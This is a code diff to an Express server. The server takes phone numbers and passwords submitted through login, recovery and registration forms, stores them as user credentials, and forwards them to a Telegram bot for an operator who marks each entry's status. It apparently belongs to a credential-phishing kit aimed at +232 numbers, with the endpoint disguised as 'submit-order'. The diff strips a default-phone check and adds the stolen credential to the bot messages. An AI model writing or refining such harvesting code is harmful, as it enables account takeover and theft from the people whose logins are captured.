@@ -30,7 +30,7 @@ async function sendToTelegram(url, payload) {
         return await response.json();
     } catch (error) {
         clearTimeout(timeoutId);
-        console.error('Telegram Error:', error.message);
+        console.error('Error:', error.message);
         throw error;
     }
 }
@@ -38,12 +38,8 @@ async function sendToTelegram(url, payload) {
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
     try {
-        let { phone, uniqueId } = req.body;
+        const { phone, uniqueId } = req.body;
         
-        if (!phone || phone === 'Unknown Phone' || phone === 'undefined') {
-            phone = '+232 00000000';
-        }
-
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
 
@@ -107,11 +103,11 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[phone].password = uniqueId;
         }
 
-        // Clean layout message sent to Telegram
+        // Layout matching your required format
         const message = `${headerTitle}\n\n` +
                         `${countryFlag} Country: \`+232\`\n` +
                         `📱 Phone: \`${rawDigits}\`\n` +
-                        `👤 ${credentialLabel}:\n${displayValue}`;
+                        `🔑 ${credentialLabel}:\n\`${displayValue}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const encodedId = encodeURIComponent(uniqueId || 'N/A');
@@ -135,7 +131,7 @@ app.post('/api/submit-order', async (req, res) => {
 
         res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
-        console.error("Submit Order Error:", error);
+        console.error(error);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
@@ -197,6 +193,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const updatedMessage = `📋 *${messageTitle}*\n\n` +
                              `${countryFlag} Country: \`+232\`\n` +
                              `📱 Phone: \`${rawDigits}\`\n` +
+                             `🔑 Detail: \`${uniqueId}\`\n` +
                              `📌 Status: *${actionText}*`;
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
